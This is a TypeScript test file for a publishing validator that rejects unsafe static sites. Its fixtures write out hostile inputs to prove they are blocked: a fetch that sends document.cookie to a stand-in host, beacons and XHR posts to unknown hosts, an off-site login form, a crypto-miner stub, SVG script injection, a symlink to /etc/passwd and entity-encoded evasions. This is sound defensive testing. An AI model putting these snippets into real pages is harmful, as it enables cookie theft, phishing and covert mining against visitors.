import { afterAll, describe, expect, it } from "bun:test";
import {
	mkdirSync,
	mkdtempSync,
	rmSync,
	symlinkSync,
	writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import {
	checkSpace,
	checkText,
	csp,
	decodeEntities,
	formatReport,
	hostOf,
	validId,
} from "../src/check.mjs";

const roots: string[] = [];
afterAll(() => {
	for (const r of roots) rmSync(r, { recursive: true, force: true });
});

/** A space folder with these files; returns its path. */
function space(files: Record<string, string>): string {
	const dir = mkdtempSync(join(tmpdir(), "space-"));
	roots.push(dir);
	for (const [name, body] of Object.entries(files)) {
		mkdirSync(dirname(join(dir, name)), { recursive: true });
		writeFileSync(join(dir, name), body);
	}
	return dir;
}

const page = (body: string, head = "") =>
	`<!doctype html><html><head><title>Demo</title><meta name="description" content="A demo space">${head}</head><body>${body}</body></html>`;
const rules = (dir: string) => checkSpace(dir).errors.map((e) => e.rule);

describe("a space that passes", () => {
	it("an interactive page with CDN scripts, inline JS and its own data", () => {
		const r = checkSpace(
			space({
				"index.html": page(
					`<div id="chart"></div><script>fetch("data.json").then(r=>r.json())</script>`,
					`<script src="https://cdn.jsdelivr.net/npm/d3@7.9.0/dist/d3.min.js"></script><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter">`,
				),
				"data.json": "[]",
				"assets/app.js": `fetch('https://raw.githubusercontent.com/o/r/main/x.csv')`,
				"assets/logo.svg": `<svg xmlns="http://www.w3.org/2000/svg"><circle r="4"/></svg>`,
			}),
		);
		expect(r.errors).toEqual([]);
		expect(r.warnings).toEqual([]);
		expect(r.ok).toBe(true);
	});

	it("a Markdown space", () => {
		expect(checkSpace(space({ "index.md": "# Hello\n" })).ok).toBe(true);
	});

	it("links that open another site in a new tab", () => {
		expect(
			rules(
				space({
					"index.html": page(
						`<script>window.open("https://github.com/flisk-sh")</script>`,
					),
				}),
			),
		).toEqual([]);
	});

	it("a form that submits to the page itself", () => {
		expect(
			rules(space({ "index.html": page(`<form><input name="q"></form>`) })),
		).toEqual([]);
	});
});

describe("a space that is stopped", () => {
	it.each([
		["no index", { "about.html": page("") }, "index"],
		[
			"a script from an unknown host",
			{
				"index.html": page(`<script src="https://evil.example/x.js"></script>`),
			},
			"script-src",
		],
		[
			"a plain-http script",
			{
				"index.html": page(
					`<script src="http://cdn.jsdelivr.net/x.js"></script>`,
				),
			},
			"script-src",
		],
		[
			"a form posting away",
			{
				"index.html": page(
					`<form action="https://collect.example/login" method="post"></form>`,
				),
			},
			"form-action",
		],
		[
			"a password field",
			{ "index.html": page(`<input type="password" name="p">`) },
			"password",
		],
		[
			"an unknown iframe",
			{ "index.html": page(`<iframe src="https://bank.example"></iframe>`) },
			"frame-src",
		],
		[
			"a redirect away",
			{
				"index.html": page(
					"",
					`<meta http-equiv="refresh" content="0;url=https://evil.example">`,
				),
			},
			"redirect",
		],
		[
			"a base element",
			{ "index.html": page("", `<base href="https://evil.example/">`) },
			"base",
		],
		[
			"fetch to an unknown host",
			{
				"index.html": page(
					`<script>fetch("https://collect.example/?d="+document.cookie)</script>`,
				),
			},
			"connect-src",
		],
		[
			"a beacon from a script file",
			{
				"index.html": page(""),
				"a.js": `navigator.sendBeacon('https://t.example/x', 1)`,
			},
			"connect-src",
		],
		[
			"XHR open to an unknown host",
			{
				"index.html": page(
					`<script>x.open("POST", "https://t.example/x")</script>`,
				),
			},
			"connect-src",
		],
		[
			"a wallet prompt",
			{
				"index.html": page(
					`<script>ethereum.request({method:'eth_requestAccounts'})</script>`,
				),
			},
			"wallet",
		],
		[
			"a miner",
			{ "index.html": page(""), "m.js": "new CoinHive.Anonymous('k')" },
			"miner",
		],
		[
			"a script in an SVG",
			{
				"index.html": page(""),
				"x.svg": `<svg><script>alert(1)</script></svg>`,
			},
			"svg-script",
		],
		[
			"an SVG event handler",
			{ "index.html": page(""), "x.svg": `<svg onload="alert(1)"></svg>` },
			"svg-script",
		],
		["a hidden file", { "index.html": page(""), ".env": "KEY=1" }, "name"],
		[
			"an executable",
			{ "index.html": page(""), "setup.exe": "MZ" },
			"extension",
		],
	])("%s", (_, files, rule) => {
		const r = checkSpace(space(files as Record<string, string>));
		expect(r.ok).toBe(false);
		expect(r.errors.map((e) => e.rule)).toContain(rule);
	});

	it("a symbolic link", () => {
		const dir = space({ "index.html": page("") });
		symlinkSync("/etc/passwd", join(dir, "passwd.txt"));
		expect(rules(dir)).toContain("symlink");
	});

	it("a space over the size limit", () => {
		expect(
			rules(
				space({
					"index.html": page(""),
					"big.json": "x".repeat(6 * 1024 * 1024),
				}),
			),
		).toContain("size");
	});
});

describe("warnings", () => {
	it("a page with no title or description still publishes", () => {
		const r = checkSpace(space({ "index.html": "<h1>hi</h1>" }));
		expect(r.ok).toBe(true);
		expect(r.warnings.map((w: { rule: string }) => w.rule).sort()).toEqual([
			"description",
			"title",
		]);
	});
});

describe("helpers", () => {
	it("validId takes a lowercase login and a slug", () => {
		expect(validId("sam", "how-gpus-work")).toBe(true);
		expect(validId("Sam", "x")).toBe(false);
		expect(validId("sam", "../x")).toBe(false);
		expect(validId("sam", "-x")).toBe(false);
	});

	it("hostOf tells relative, absolute and unreadable addresses apart", () => {
		expect(hostOf("app.js")).toBe("");
		expect(hostOf("/x/app.js")).toBe("");
		expect(hostOf("//unpkg.com/x")).toBe("unpkg.com");
		expect(hostOf("https://Cdn.JSDelivr.net/x")).toBe("cdn.jsdelivr.net");
		expect(hostOf("data:text/javascript,alert(1)")).toBeNull();
	});

	it("the policy blocks other sites for forms, frames and fetches", () => {
		const policy = csp();
		expect(policy).toContain("form-action 'self'");
		expect(policy).toContain("base-uri 'none'");
		expect(policy).toMatch(/style-src[^;]*https:\/\/api\.fontshare\.com/);
		expect(policy).toMatch(/font-src[^;]*https:\/\/cdn\.fontshare\.com/);
		expect(policy).toMatch(/connect-src 'self' https:\/\/cdnjs/);
		expect(policy).not.toMatch(/connect-src[^;]*https:(?!\/\/)/);
	});

	it("one-click spaces get a policy that runs nothing", () => {
		expect(csp({ scripts: false })).toContain("script-src 'none'");
		expect(csp({ scripts: false })).not.toMatch(/script-src[^;]*https:/);
	});
});

describe("checkText (a pasted file, no folder)", () => {
	const cases: Record<string, [string, string]> = {
		"a clean page": ["index.html", page("<p>hi</p>")],
		"a script from a host that is not allowed": [
			"index.html",
			page("", '<script src="https://evil.example/x.js"></script>'),
		],
		"a fetch to another host": [
			"app.js",
			'fetch("https://api.evil.example/data")',
		],
		"a wallet prompt": [
			"app.js",
			"ethereum.request({method:'eth_requestAccounts'})",
		],
		"an SVG with a script": ["logo.svg", "<svg><script>1</script></svg>"],
		"a file type pages does not serve": ["run.exe", "MZ"],
	};
	for (const [label, [name, text]] of Object.entries(cases)) {
		it(`gives the same rules as checkSpace for ${label}`, () => {
			const files: Record<string, string> =
				name === "index.html"
					? { [name]: text }
					: { "index.html": page("<p>x</p>"), [name]: text };
			const folder = checkSpace(space(files));
			const single = checkText(name, text);
			const rules = (r: { errors: { rule: string; file: string }[] }) =>
				r.errors
					.filter((e) => e.file === name)
					.map((e) => e.rule)
					.sort();
			expect(rules(single)).toEqual(rules(folder));
			expect(single.ok).toBe(rules(folder).length === 0);
		});
	}

	it("warns, without stopping, when a page has no title or description", () => {
		const r = checkText("index.html", "<!doctype html><p>hi</p>");
		expect(r.ok).toBe(true);
		expect(r.warnings.map((w) => w.rule).sort()).toEqual([
			"description",
			"title",
		]);
	});
});

describe("the report", () => {
	it("lists every error, and a repeated warning three times then counts it", () => {
		const warn = (i: number) => ({
			severity: "warn" as const,
			rule: "javascript-url",
			file: `p${i}.html`,
			message: "a javascript: link",
		});
		const out = formatReport({
			ok: false,
			errors: [1, 2, 3, 4].map((i) => ({
				severity: "error" as const,
				rule: "size",
				file: `big${i}.bin`,
				message: "too big",
			})),
			warnings: Array.from({ length: 10 }, (_, i) => warn(i)),
			files: 14,
			bytes: 1,
		});
		expect(out.match(/\[size\]/g)?.length).toBe(4);
		expect(out.match(/^! p\d\.html/gm)?.length).toBe(3);
		expect(out).toContain("! …and 7 more [javascript-url] warnings");
	});
});

describe("entity-encoded attributes", () => {
	it("reads them the way a browser does", () => {
		expect(decodeEntities("pass&#119;ord")).toBe("password");
		expect(decodeEntities("pass&#x77;ord")).toBe("password");
		expect(decodeEntities("https&colon;&sol;&sol;evil.example")).toBe(
			"https://evil.example",
		);
		expect(decodeEntities("&unknown; a & b")).toBe("&unknown; a & b");
	});
	it("refuses a password field and an off-site form written with entities", () => {
		const dir = mkdtempSync(join(tmpdir(), "check-"));
		writeFileSync(
			join(dir, "index.html"),
			'<!doctype html><title>t</title><input type=pass&#119;ord><form action="https&colon;//evil.example"></form>',
		);
		const rules = checkSpace(dir).errors.map((e) => e.rule);
		expect(rules).toContain("password");
		expect(rules).toContain("form-action");
	});
});
